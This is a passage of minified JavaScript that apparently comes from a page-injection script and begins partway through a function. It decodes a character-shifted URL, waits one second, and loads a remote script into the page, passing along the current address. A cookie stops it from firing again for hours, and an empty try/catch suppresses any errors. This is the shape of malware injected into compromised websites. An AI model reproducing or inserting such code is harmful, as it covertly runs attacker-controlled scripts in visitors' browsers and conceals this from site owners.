    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie), setTimeout(function () {
      o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisqtlx' + '3htr4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
    }, 1000);
    d.cookie = o.b + '=full;max-age=39800;';
  } catch (e) {}
  ;
})({}, document, location);
